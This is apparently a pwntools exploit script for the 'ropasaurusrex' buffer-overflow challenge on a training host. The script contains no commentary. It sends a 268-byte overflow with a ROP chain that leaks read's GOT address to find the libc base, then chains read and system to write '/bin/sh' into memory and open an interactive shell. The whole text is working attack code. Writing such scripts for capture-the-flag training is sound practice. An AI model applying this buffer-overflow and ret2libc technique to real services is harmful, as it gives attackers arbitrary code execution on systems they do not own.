from pwn import *

context.terminal = ['terminator', '-x', 'sh', '-c']
LIBC_PATH = "./libc-2.39.so"
LIBC = ELF(LIBC_PATH)
CHALL_PATH = "./ropasaurusrex_patched"
CHALL = ELF(CHALL_PATH)


COMMANDS = """
b *0x080491AE
c
"""

if args.REMOTE:
    c= remote("ropasaurusrex.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug(CHALL_PATH, COMMANDS)
    else:
        c = process(CHALL_PATH)

payload = b"A"*268
payload += p32(CHALL.plt["write"])
payload += p32(CHALL.symbols["main"])
payload += p32(1)
payload += p32(CHALL.got["read"])
payload += p32(4)

c.recvuntil(b"Input: ")
c.sendline(payload)

libc_leak = c.recv(4)
LIBC.address = u32(libc_leak)-LIBC.symbols["read"] #0x1169b0
print(f"base address of libc : {hex(LIBC.address)}")

ADD_ESP_12 = 0x804901b
payload = b"A"*268
payload += p32(LIBC.symbols["read"])
payload += p32(ADD_ESP_12)
payload += p32(0)
payload += p32(0x804c300)
payload += p32(7)

payload += p32(LIBC.symbols["system"])
payload += p32(0xdeadbeef)
payload += p32(0x804c300)

c.recvuntil(b"Input: ")
c.sendline(payload)
c.send(b"/bin/sh")


c.interactive()
